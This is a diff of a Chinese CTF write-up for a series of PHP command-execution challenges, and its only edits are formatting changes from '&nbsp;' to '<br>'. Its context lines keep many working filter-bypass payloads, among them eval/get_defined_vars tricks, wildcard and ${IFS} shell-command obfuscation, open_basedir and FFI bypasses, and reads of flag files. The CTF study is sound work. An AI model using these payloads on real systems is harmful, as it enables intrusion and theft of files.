@@ -55,7 +55,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426112927919.png" alt="image-20250426112927919" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -99,7 +99,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426114032665.png" alt="image-20250426114032665" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -133,7 +133,7 @@ if(isset($_GET['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -161,9 +161,9 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426120052078.png" alt="image-20250426120052078" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
-&nbsp;
+<br>
 
 
 
@@ -179,7 +179,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426143314154.png" alt="image-20250426143314154" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -223,13 +223,13 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426134002689.png" alt="image-20250426134002689" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250426133944069.png" alt="image-20250426133944069" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -262,7 +262,7 @@ if(isset($_GET['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -278,7 +278,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426143608404.png" alt="image-20250426143608404" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -290,7 +290,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426144027048.png" alt="image-20250426144027048" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -339,7 +339,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426135503562.png" alt="image-20250426135503562" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -382,7 +382,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426135943905.png" alt="image-20250426135943905" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -427,7 +427,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426140956823.png" alt="image-20250426140956823" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -469,7 +469,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426185406502.png" alt="image-20250426185406502" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -479,7 +479,7 @@ if(isset($_GET['c'])){
 >
 > 换句话说，**`system()` 的输出并不是被 `include()` 捕获，而是直接写入到 HTTP 响应中** 。这就是为什么你能看到 `flag.php` 的内容。
 
-&nbsp;
+<br>
 
 ---
 
@@ -539,7 +539,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250426190031953.png" alt="image-20250426190031953" style="zoom: 50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -573,7 +573,7 @@ if(isset($_GET['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -587,7 +587,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250427123513944.png" alt="image-20250427123513944" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -620,7 +620,7 @@ if(isset($_GET['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -667,7 +667,7 @@ array_reverse() 以相反的元素顺序返回数组
 ?c=print_r(scandir(reset(localeconv())));
 ```
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250503112614366.png" alt="image-20250503112614366" style="zoom:80%;" />
 
@@ -675,7 +675,7 @@ array_reverse() 以相反的元素顺序返回数组
 Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php )
 ```
 
-&nbsp;
+<br>
 
 **可以发现 `flag.php` 在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取。以下payload达到的效果是：输出 `flag.php` 源码，安全绕过字符过滤器**
 
@@ -689,7 +689,7 @@ Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php )
 
 <img src="\images\article_images\image-20250503113247089.png" alt="image-20250503113247089" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -703,7 +703,7 @@ Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php )
 
 <img src="\images\article_images\image-20250503115725841.png" alt="image-20250503115725841" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -721,7 +721,7 @@ Array (
 
 **说明现在已经有变量 `$_GET`、`$_POST`、还有 `c` 等都在作用域内。**
 
-&nbsp;
+<br>
 
 
 
@@ -735,7 +735,7 @@ Array (
 
 <img src="\images\article_images\image-20250503120006048.png" alt="image-20250503120006048" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -749,7 +749,7 @@ Array (
 )
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -763,13 +763,13 @@ Array (
 
 <img src="\images\article_images\image-20250503120059077.png" alt="image-20250503120059077" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
 **然后我们想让 `eval()` 执行这个 `phpinfo();`，但我们不能直接写 `eval($_POST['1'])`，因为 `[` 和 `]` 被正则拦截了。**
 
-&nbsp;
+<br>
 
 
 
@@ -789,13 +789,13 @@ array_pop(...)           // 从这个数组中“弹出”最后一个值
 
 <img src="\images\article_images\image-20250503124459045.png" alt="image-20250503124459045" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
 **页面返回 phpinfo()     这意味着我们已经成功拿到了想要执行的恶意代码字符串**
 
-&nbsp;
+<br>
 
 
 
@@ -807,7 +807,7 @@ array_pop(...)           // 从这个数组中“弹出”最后一个值
 
 <img src="\images\article_images\image-20250503124621948.png" alt="image-20250503124621948" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -819,7 +819,7 @@ array_pop(...)           // 从这个数组中“弹出”最后一个值
 
 <img src="\images\article_images\image-20250503124758256.png" alt="image-20250503124758256" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -837,7 +837,7 @@ eval(array_pop(next(get_defined_vars())))
 system("tac fla*");
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -874,7 +874,7 @@ if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
 
 **滤 `$`、`+`、`-`、`^`、`~` ），但是可以用 `|` (或)**
 
-&nbsp;
+<br>
 
 **==题解一==**
 
@@ -923,13 +923,13 @@ fclose($myfile);
 
 <img src="\images\article_images\image-20250503153743360.png" alt="image-20250503153743360" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **运行python脚本 `rec_or.py`** 
 
 <img src="\images\article_images\image-20250503154445517.png" alt="image-20250503154445517" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 **cmd命令**
 
@@ -993,7 +993,7 @@ while True:
 
 
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -1049,7 +1049,7 @@ print(res.text)
 
 <img src="\images\article_images\image-20250503161318154.png" alt="image-20250503161318154" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1078,7 +1078,7 @@ if(isset($_GET['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 > **`/dev/null` —— “黑洞”设备文件**
 >
@@ -1095,7 +1095,7 @@ if(isset($_GET['c'])){
 > | `command 2> /dev/null`     | 把标准错误丢弃，屏蔽错误信息                     |
 > | `command > /dev/null 2>&1` | 同时屏蔽标准输出和标准错误，终端不会显示任何信息 |
 >
-> &nbsp;
+> <br>
 >
 > **`1>/dev/null 2>&1` 的含义和解析**
 >
@@ -1116,7 +1116,7 @@ if(isset($_GET['c'])){
 > | `2>`        | 标准错误（stderr，文件描述符2）的重定向                   |
 > | `&1`        | 代表“重定向到与文件描述符1相同的地方”，即stdout当前的去向 |
 >
-> &nbsp;
+> <br>
 >
 > 🎯 整体理解：
 >
@@ -1125,7 +1125,7 @@ if(isset($_GET['c'])){
 >
 > ✅ 所以最终效果是：**所有输出（正常 + 错误）全部被丢弃，终端不会显示任何信息。**
 
-&nbsp;
+<br>
 
 **题目这里是 `$c` 参数后面接了个 `>/dev/null 2>&1` ，使用`> /dev/null 2>&1`将命令结果全部丢弃（不进行回显的意思）**
 
@@ -1149,7 +1149,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503170615023.png" alt="image-20250503170615023" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1192,7 +1192,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503171813642.png" alt="image-20250503171813642" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1235,7 +1235,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503172131947.png" alt="image-20250503172131947" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1280,7 +1280,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503172518578.png" alt="image-20250503172518578" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1324,7 +1324,7 @@ if(isset($_GET['c'])){
 ?c=tac%09fla?.???||
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -1366,7 +1366,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503190038198.png" alt="image-20250503190038198" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1403,7 +1403,7 @@ if(isset($_GET['c'])){
 ?c=tac%09fla?.php||
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -1442,7 +1442,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503190526773.png" alt="image-20250503190526773" style="zoom: 50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1490,7 +1490,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503191717813.png" alt="image-20250503191717813" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1533,7 +1533,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503192158790.png" alt="image-20250503192158790" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ----
 
@@ -1564,7 +1564,7 @@ if(isset($_GET['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **过滤了 `<>`**
 
@@ -1576,7 +1576,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503193322495.png" alt="image-20250503193322495" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 **查看根目录**
 
@@ -1586,7 +1586,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503194743382.png" alt="image-20250503194743382" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 **查看根目录下的flag文件（根目录是 `/`）**
 
@@ -1596,7 +1596,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503195142251.png" alt="image-20250503195142251" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1641,7 +1641,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503195833343.png" alt="image-20250503195833343" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1672,7 +1672,7 @@ if(isset($_GET['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **==题解一==**
 
@@ -1690,7 +1690,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503205018028.png" alt="image-20250503205018028" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -1702,7 +1702,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503210636208.png" alt="image-20250503210636208" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 **将 `flag.php` 重命名为 `a.txt`**
 
@@ -1714,7 +1714,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503214250838.png" alt="image-20250503214250838" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **再次查看当前目录，可见重命名成功**
 
@@ -1724,7 +1724,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503214308471.png" alt="image-20250503214308471" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **访问 `/a.txt` 即可**
 
@@ -1734,7 +1734,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503214330571.png" alt="image-20250503214330571" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1750,7 +1750,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503213904015.png" alt="image-20250503213904015" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **再次查看当前目录，可见复制成功**
 
@@ -1760,7 +1760,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503213923696.png" alt="image-20250503213923696" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **访问 `/b.txt`**
 
@@ -1770,7 +1770,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250503213817077.png" alt="image-20250503213817077" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1803,13 +1803,13 @@ if(isset($_GET['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 > **bin目录:**
 >
 > bin为binary的简写主要放置一些系统的必备执行档例如: cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等
 
-&nbsp;
+<br>
 
 **==题解一==** 
 
@@ -1827,11 +1827,11 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250504102028319.png" alt="image-20250504102028319" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250504102100579.png" alt="image-20250504102100579" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1853,7 +1853,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250504000706256.png" alt="image-20250504000706256" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 **访问 `/flag.php.bz2`** **，下载压缩包**
 
@@ -1863,7 +1863,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250504000808248.png" alt="image-20250504000808248" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **==题解三==**
 
@@ -1897,7 +1897,7 @@ if(isset($_GET['c'])){
 
 <img src="\images\article_images\image-20250504105948719.png" alt="image-20250504105948719" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 **抓包**
 
@@ -1912,7 +1912,7 @@ ls
 
 <img src="\images\article_images\image-20250504105905692.png" alt="image-20250504105905692" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 ```bash
 #!/bin/sh
@@ -1921,7 +1921,7 @@ cat flag.php
 
 <img src="\images\article_images\image-20250504105824820.png" alt="image-20250504105824820" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -1954,13 +1954,13 @@ if(isset($_GET['c'])){
 
 **在上一题的基础上过滤了数字**
 
-&nbsp;
+<br>
 
 **==题解一==**
 
 **同web55**
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -1982,7 +1982,7 @@ while True:
 
 <img src="\images\article_images\image-20250504114615330.png" alt="image-20250504114615330" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -2037,7 +2037,7 @@ $(())能进⾏的运算有
 
 **所以我们只要构造出 `-37`，然后按位取反就能得到 `36`**
 
-&nbsp;
+<br>
 
 **使用python生成**
 
@@ -2047,7 +2047,7 @@ print("$((~$(("+"$((~$(())))"*37+"))))")
 
 <img src="\images\article_images\image-20250504125334999.png" alt="image-20250504125334999" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 **payload**
 
@@ -2055,7 +2055,7 @@ print("$((~$(("+"$((~$(())))"*37+"))))")
 ?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
 ```
 
-&nbsp;
+<br>
 
 **查看源代码**
 
@@ -2063,7 +2063,7 @@ print("$((~$(("+"$((~$(())))"*37+"))))")
 
 
 
-&nbsp;
+<br>
 
 ---
 
@@ -2092,7 +2092,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 > ```bash
 > c=print_r(scandir(dirname('__FILE__')));
@@ -2116,7 +2116,7 @@ c=rename("flag.php","b.txt");       #之后访问/b.txt
 
 <img src="\images\article_images\image-20250504131146433.png" alt="image-20250504131146433" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -2145,7 +2145,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **payload**
 
@@ -2160,7 +2160,7 @@ c=include($_GET[a]);    #post
 c=print_r(file("flag.php"));
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2216,7 +2216,7 @@ c=highlight_file(array_slice(scandir('.'), 2, 1)[0]);
 #[0]：取数组索引为0的，即取出文件名字符串（截取后的数组[0 => 'flag.php']）
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2245,7 +2245,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **payload**
 
@@ -2260,7 +2260,7 @@ c=include($_GET[a]);    #post
 c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2289,7 +2289,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **payload**
 
@@ -2314,7 +2314,7 @@ c=include($_GET[a]);    #post
 c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2343,7 +2343,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **payload**
 
@@ -2361,7 +2361,7 @@ c=include($_GET[a]);    #post
 c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2390,7 +2390,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **payload**
 
@@ -2408,7 +2408,7 @@ c=include($_GET[a]);    #post
 c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2437,7 +2437,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 > **file_get_contents() has been disabled**
 
@@ -2457,7 +2457,7 @@ c=include($_GET[a]);    #post
 c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2486,7 +2486,7 @@ if(isset($_POST['c'])){
 }
 ```
 
-&nbsp;
+<br>
 
 **`show_source()` 被禁用了**
 
@@ -2517,7 +2517,7 @@ c=print_r(scandir("."));
 
 **没有其他发现**
 
-&nbsp;
+<br>
 
 **查看根目录下的文件**
 
@@ -2530,7 +2530,7 @@ c=print_r(scandir("/"));
 
 **在根目录下找到 `flag.txt`**
 
-&nbsp;
+<br>
 
 **于是payload**
 
@@ -2541,7 +2541,7 @@ c=require("/flag.txt");
 
 <img src="\images\article_images\image-20250504144649877.png" alt="image-20250504144649877" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -2579,7 +2579,7 @@ c=highlight_file('/flag.txt');
 c=require("/flag.txt");
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2589,7 +2589,7 @@ c=require("/flag.txt");
 Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19
 ```
 
-&nbsp;
+<br>
 
 **有几个函数被禁用了**
 
@@ -2618,7 +2618,7 @@ c=require("/flag.txt");
 
 <img src="\images\article_images\image-20250504152254384.png" alt="image-20250504152254384" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -2628,7 +2628,7 @@ c=require("/flag.txt");
 Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19
 ```
 
-&nbsp;
+<br>
 
 **这一题的 `print_r` `var_dump`  `highlight_file` 都被禁用了**
 
@@ -2647,7 +2647,7 @@ c=include("/flag.txt");
 c=require("/flag.txt");
 ```
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -2665,7 +2665,7 @@ c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().
 
 <img src="\images\article_images\image-20250504162303870.png" alt="image-20250504162303870" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 **输出flag内容**
 
@@ -2675,7 +2675,7 @@ c=require("/flag.txt");
 #直接输出 flag.txt 的内容
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2690,7 +2690,7 @@ Warning: highlight_file() has been disabled for security reasons in /var/www/htm
 你要上天吗？
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2709,7 +2709,7 @@ c=include("/flag.txt");
 c=require("/flag.txt");
 ```
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -2727,7 +2727,7 @@ c=include("/flag.txt");
 c=require("/flag.txt");
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2779,7 +2779,7 @@ if(isset($_POST['c'])){
 
 **最终输出经过替换的结果，所有字母和数字都被替换成了 `?`。**
 
-&nbsp;
+<br>
 
 **利用 `exit()` 可以让前面的语句执行完就退出，而不需要执行后面的语句。**
 
@@ -2796,7 +2796,7 @@ c=include("/flag.txt");exit();
 c=require("/flag.txt");exit();
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -2836,7 +2836,7 @@ if(isset($_POST['c'])){
 
 **和上一题是有区别的**
 
-&nbsp;
+<br>
 
 **这道题只有这个命令可以查询根目录文件**
 
@@ -2848,11 +2848,11 @@ c=$a=new DirectoryIterator("glob:///*.txt");foreach($a as $f){echo($f->__toStrin
 
 <img src="\images\article_images\image-20250504170507403.png" alt="image-20250504170507403" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **flag文件名改变了，`flag0.txt`**
 
-&nbsp;
+<br>
 
 **当想用 `c=include(“/flag0.txt);exit();”` 时，发现有 `open_basedir` 限制**
 
@@ -2862,21 +2862,21 @@ Warning: include(): open_basedir restriction in effect. File(/flag0.txt) is not 
 
 <img src="\images\article_images\image-20250504170917523.png" alt="image-20250504170917523" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 >  **`open_basedir` ：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如 `fopen()` 或 `file_get_contents()` 打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开**
 
-&nbsp;
+<br>
 
 **用uaf脚本来命令执行，脚本( `c=` 之后)要进行URL编码**
 
 <img src="\images\article_images\image-20250504173623856.png" alt="image-20250504173623856" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 <img src="\images\article_images\image-20250504172814598.png" alt="image-20250504172814598" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 **POC脚本**
 
@@ -3074,13 +3074,13 @@ ctfshow("cat /flag0.txt");    #在这里修改flag文件名
 ob_end_flush();
 ```
 
-&nbsp;
+<br>
 
 ---
 
 # web73
 
-&nbsp;
+<br>
 
 **==题解一==**
 
@@ -3101,7 +3101,7 @@ c=include("/flagc.txt");exit();
 c=require("/flagc.txt");exit();
 ```
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -3117,7 +3117,7 @@ c=include($_GET[a]);exit();
 ?a=php://filter/convert.base64-encode/resource=/flagc.txt
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -3143,7 +3143,7 @@ c=include("/flagx.txt");exit();
 c=require("/flagx.txt");exit();
 ```
 
-&nbsp;
+<br>
 
 **==题解二==**
 
@@ -3159,7 +3159,7 @@ c=include($_GET[a]);exit();
 ?a=php://filter/convert.base64-encode/resource=/flagx.txt
 ```
 
-&nbsp;
+<br>
 
 ---
 
@@ -3173,7 +3173,7 @@ c=$a=new DirectoryIterator("glob:///*");foreach($a as $b){echo ($b->__toString()
 
 **这道题 `include` `require` 都不能用了**
 
-&nbsp;
+<br>
 
 **利用 `mysql` 的 `load_file()` 来查看文件**
 
@@ -3198,7 +3198,7 @@ exit(0);
 
 <img src="\images\article_images\image-20250504201927786.png" alt="image-20250504201927786" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -3206,7 +3206,7 @@ exit(0);
 
 **`opendir()` 无法使用**
 
-&nbsp;
+<br>
 
 **查看根目录下文件**
 
@@ -3217,11 +3217,11 @@ c=$a=new DirectoryIterator("glob:///*");foreach($a as $b){echo ($b-> __toString(
 
 <img src="\images\article_images\image-20250504203612083.png" alt="image-20250504203612083" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 **flag文件名为 `flag36d.txt`**
 
-&nbsp;
+<br>
 
 **利用mysql的 `load_file()` 来查看文件**
 
@@ -3246,7 +3246,7 @@ exit(0);
 
 <img src="\images\article_images\image-20250504203835884.png" alt="image-20250504203835884" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 ---
 
@@ -3263,13 +3263,13 @@ c=$a=new DirectoryIterator("glob:///*");foreach($a as $b){echo ($b-> __toString(
 
 **flag文件名为 `flag36x.txt`**
 
-&nbsp;
+<br>
 
 **再次使用上一题的脚本发现无法得到flag**
 
 <img src="\images\article_images\image-20250504210940389.png" alt="image-20250504210940389" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 **因为不能回显，所以利用重定向将 `readflag`内容输出到其他地方**
 
@@ -3284,7 +3284,7 @@ exit();
 
 <img src="\images\article_images\image-20250504211340151.png" alt="image-20250504211340151" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 > **这个解法是一个利用 PHP 的 FFI 技术（Foreign Function Interface） 来调用底层 C 标准库函数 `system()` 的 命令执行漏洞利用技巧，结合参数注入直接拿到服务器上的 `flag` 文件。**
 
@@ -3319,7 +3319,7 @@ exit();
 
 <img src="\images\article_images\image-20250505115731893.png" alt="image-20250505115731893" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 **题目给的提示：**
 
@@ -3327,13 +3327,13 @@ exit();
 
 **由题目知 `flag`位于 `flag.php`**
 
-&nbsp;
+<br>
 
 **查看源代码，知道从输入框 `输入的内容` 就成了 `system` 命令里所谓的 `$code`**
 
 <img src="\images\article_images\image-20250505115856799.png" alt="image-20250505115856799" style="zoom: 50%;" />
 
-&nbsp;
+<br>
 
 **尝试输入，发现有一些输入会回显 `evil input`，存在过滤**
 
@@ -3347,7 +3347,7 @@ exit();
 
 **小写字母和数字都被过滤了**
 
-&nbsp;
+<br>
 
 **不管怎样，我们最终的目的是不变的，就是要想办法构造一个命令，能达到 `tac flag.php` 的效果**
 
@@ -3355,7 +3355,7 @@ exit();
 
 <img src="\images\article_images\image-20250505114504396.png" alt="image-20250505114504396" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 ```bash
 #PWD：输出当前所在路径
@@ -3407,7 +3407,7 @@ user@LAPTOP-HHK0H1KL:~$ echo ${PATH}
 
 **比如对于 `cat`、`tac`、`more`、`less`、`head`、`tail`、`nl`、`sed`、`sort`、`uniq`、`rev`，这些命令，我们肯定要选 `nl` ，不妨看看上面指令 `echo ${PATH}` ，输出内容中的最后一个字符就是 `n` ，那么利用 `echo ${PWD:A}` 就很容易构造出来 `n`**
 
-&nbsp;
+<br>
 
 **于是，我们目标明确，利用内置变量，构造出命令 `nl flag.php`**
 
@@ -3415,13 +3415,13 @@ user@LAPTOP-HHK0H1KL:~$ echo ${PATH}
 
 <img src="\images\article_images\image-20250505125629736.png" alt="image-20250505125629736" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 **所以，`${PATH:~A}${PWD:~A}` 等价于 `nl`**
 
 **空格和小写字母被过滤，用 `${IFS}` 和 通配符 `?` 代替**
 
-&nbsp;
+<br>
 
 **`${PATH:~A}${PWD:~A}${IFS}????.???`**
 
@@ -3429,7 +3429,7 @@ user@LAPTOP-HHK0H1KL:~$ echo ${PATH}
 
 **等价于     `nl flag.php`** 
 
-&nbsp;
+<br>
 
 **payload**
 
@@ -3441,13 +3441,13 @@ ${PATH:~A}${PWD:~A}${IFS}????.???
 
 <img src="\images\article_images\image-20250505131213077.png" alt="image-20250505131213077" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
 **其他payload**
 
-&nbsp;
+<br>
 
 ```bash
 #输出可执行程序搜索路径
@@ -3508,7 +3508,7 @@ user@LAPTOP-HHK0H1KL:~$ echo ${PATH}
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
-&nbsp;
+<br>
 
 ```bash
 # (根据题目给的payload反向推理) 题目附件的网址 "yu-love" 合理推测这道题靶机的输出
@@ -3528,7 +3528,7 @@ yu-love@LAPTOP-HHK0H1KL:~$ echo ${#TERM}
 4
 ```
 
-&nbsp;
+<br>
 
 **(其实本质上都是构造 `nl flag.php`)**
 
@@ -3554,7 +3554,7 @@ ${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHL
